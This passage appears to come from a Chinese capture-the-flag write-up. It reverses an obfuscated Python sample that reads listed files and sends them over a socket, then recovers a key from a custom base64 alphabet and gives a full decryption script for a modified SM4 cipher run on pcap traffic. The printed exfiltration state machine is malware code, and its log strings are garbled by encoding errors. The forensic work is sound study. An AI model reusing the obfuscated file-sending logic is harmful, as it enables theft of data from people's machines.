as e: print(f&quot;[!] ����ʧ�ܣ�&#123;e&#125;&quot;) _state = 99 elif _state == 20: if _idx &lt; len(FILES_TO_SEND): _state = 21 else: _state = 30 elif _state == 21: _fname = FILES_TO_SEND[_idx] _state = 22 elif _state == 22: if os.path.exists(_fname): _state = 23 else: _state = 28 elif _state == 23: with open(_fname, &quot;rb&quot;) as _f: _data = _f.read() _state = 24 elif _state == 24: if _opaque_true(): print(f&quot;[*] �����ļ�&quot;) _state = 25 elif _state == 25: if not _opaque_false(): send_single_file(_sock, _fname, _data) _state = 26 elif _state == 26: _idx += 1 _state = 20 elif _state == 28: print(f&quot;[-] �ļ�������&quot;) _state = 29 elif _state == 29: _idx += 1 _state = 20 elif _state == 30: if _opaque_true(): time.sleep(0.2) _state = 31 elif _state == 31: if _sock: _sock.close() _state = 99 elif _state == 99: breakif __name__ == _oe(&quot;42g9itaJ&gt;C&quot;, 83, 214, 17): _dead_calc() if _opaque_true(): main() else: _dead_calc()其中有魔改的base64解码，然后调用了crypt_core.encode_data，密文的长度全部是 16 的整数倍，所以只有前16字节参与加密去混淆后获取到密钥：passvkcDKWLAA45ocFAXBPM63X4G8XzzTE1B123456789import base64CUSTOM = &#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@&#x27;STD = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;table = str.maketrans(CUSTOM, STD)key_b64 = &#x27;eUYme4MkN1KSC1bWJZJ2w3FUJCiEXT13D2u1KmiNtfhXKZYE&#x27;std_b64 = key_b64.translate(table)key = base64.b64decode(std_b64)print(key)print(key[:16])ida分析crypt_core.so,交叉引用找到关键函数sub_60B0,发现就是魔改SM4最终解密脚本 __future__ import annotationsimport argparseimport jsonimport subprocessimport sysfrom pathlib import Path# ===== 常量 =====BLOCK_SIZE = 16KEY = b&quot;passvkcDKWLAA45o&quot;SBOX = bytes.fromhex( &quot;ecca0ef308f02aa23b182b5c37bd12a8&quot; &quot;05d3a1574f96fcf5a7141966589bbfb4&quot; &quot;39d51e1a30bc6c80b7ed4106d91767cd&quot; &quot;1d2cae240313c65383110af7c04dc49e&quot; &quot;8d001fc33f359fcb729d166facce3c5e&quot; &quot;a6e17b343632b895918952c1e7a33348&quot; &quot;04cf10eb25bb8e0f816eb343458f49f8&quot; &quot;4b59074adefdc8d0848bfbdadb28d43e&quot; &quot;a42f56beef86c762ea76e9d674a56bf9&quot; &quot;987d3a265aaf870d1b2eb2e36accf1ff&quot; &quot;d7f61cc9e870204e233dc2aadc0bf25f&quot; &quot;7afa889747d10c02317ff4751593388a&quot; &quot;429071dd73557eb55b294c9ae08cb0e5&quot; &quot;642701dfad2179949251697c22635085&quot; &quot;2de2404644a982b661d8d2b968abb15d&quot; &quot;655477a0c5ba609ce4feee99e6786d09&quot;)FK = (0x3B1F86A4, 0x83F7332D, 0x58ADBA8E, 0x71DC3F73)CK = ( 0x9A148706, 0x657904A4, 0xB0535D2D, 0x865C7AA7, 0xF7FEF2D4, 0xF09D3A8B, 0x67CB0390, 0xF3B1D1AA, 0x1941EDE3, 0xCDD55650, 0x272AA612, 0x397B1DC6, 0x767AAB6B, 0x71A39044, 0x8A77F592, 0x7B5A7907, 0x97D18251, 0xCA1960CB, 0x44B54134, 0x3F30C70A, 0x5EB36C72, 0x5569E716, 0x51BF832C, 0xF13A95BC, 0x92D9F824, 0xE75CED15, 0x4558D865, 0xBE5250CD, 0x8F658E94, 0xB4EA5DC0, 0xB0377FCE, 0x4DF44762,)# ===== 基础函数 =====def rol32(x: int, n: int) -&gt; int: x &amp;= 0xFFFFFFFF return ((x &lt;&lt; n) | (x &gt;&gt; (32 - n))) &amp; 0xFFFFFFFFdef tau(x: int) -&gt; int: return ( (SBOX[(x &gt;&gt; 24) &amp; 0xFF] &lt;&lt; 24) | (SBOX[(x &gt;&gt; 16) &amp; 0xFF] &lt;&lt; 16) | (SBOX[(x &gt;&gt; 8) &amp; 0xFF] &lt;&lt; 8) | SBOX[x &amp; 0xFF] )def l_transform(x: int) -&gt; int: return x ^ rol32(x, 2) ^ rol32(x, 10) ^ rol32(x, 18) ^ rol32(x, 24)def l_prime(x: int) -&gt; int: return x ^ rol32(x, 13) ^ rol32(x, 23)# ===== 密钥扩展 =====def expand_round_keys(key: bytes) -&gt; list[int]: if len(key) != BLOCK_SIZE: raise ValueError(&quot;invalid key length&quot;) words = [int.from_bytes(key[i:i + 4], &quot;big&quot;) for i in range(0, 16, 4)] state = [words[i] ^ FK[i] for i in range(4)] rk = [] for i in range(24): mix = state[i + 1] ^ state[i + 2] ^ state[i + 3] ^ CK[i] new = state[i] ^ l_prime(tau(mix)) state.append(new) rk.append(new) return rk# ===== 分组加解密 =====def crypt_block(block: bytes, rk: list[int]) -&gt; bytes: if len(block) != BLOCK_SIZE: raise ValueError(&quot;invalid block size&quot;) state = [int.from_bytes(block[i:i + 4], &quot;big&quot;) for i in range(0, 16, 4)] for i in range(24): mix = state[i + 1] ^ state[i + 2] ^ state[i + 3] ^ rk[i] state.append(state[i] ^ l_transform(tau(mix))) return b&quot;&quot;.join(w.to_bytes(4, &quot;big&quot;) for w in state[-1:-5:-1])def pkcs7_unpad(data: bytes) -&gt; bytes: if not data or len(data) % BLOCK_SIZE: raise ValueError(&quot;invalid padding&quot;) pad = data[-1] if pad &lt; 1 or pad &gt; BLOCK_SIZE or data[-pad:] != bytes([pad]) * pad: raise ValueError(&quot;invalid padding&quot;) return data[:-pad]def decrypt(ct: bytes, key: bytes = KEY) -&gt; bytes: if len(ct) % BLOCK_SIZE: raise ValueError(&quot;invalid ciphertext length&quot;) rk = list(reversed(expand_round_keys(key))) pt = b&quot;&quot;.join( crypt_block(ct[i:i + 16], rk) for i in range(0, len(ct), 16) ) return pkcs7_unpad(pt)# ===== PCAP 解析 =====def extract_json_messages(pcap: Path) -&gt; list[dict[str, str]]: out = subprocess.check_output( [&quot;tshark&quot;, &quot;-r&quot;, str(pcap), &quot;-q&quot;, &quot;-z&quot;, &quot;follow,tcp,raw,0&quot;], text=True, ) msgs = [] for line in out.splitlines(): line = line.strip() if not line or any(c not in &quot;0123456789abcdef&quot; for c in line): continue raw = bytes.fromhex(line) if raw.startswith(b&quot;&#123;&quot;): msgs.append(json.loads(raw.decode())) return msgs# ===== 输出 =====def print_result(name: str, pt: bytes) -&gt; None: print(f&quot;=== &#123;name&#125; ===&quot;) try: print(pt.decode()) except UnicodeDecodeError: print(pt.hex()) print()# ===== 主程序 =====def main() -&gt; int: parser = argparse.ArgumentParser() parser.add_argument(&quot;--pcap&quot;, type=Path, default=Path(&quot;capture.pcap&quot;)) parser.add_argument(&quot;--ciphertext&quot;) parser.add_argument(&quot;--raw&quot;, action=&quot;store_true&quot;) args = parser.parse_args() # 单条解密模式 if args.ciphertext: pt = decrypt(bytes.fromhex(args.ciphertext)) output = pt.hex() if args.raw else pt.decode(errors=&quot;ignore&quot;) print(output) return 0 # PCAP 模式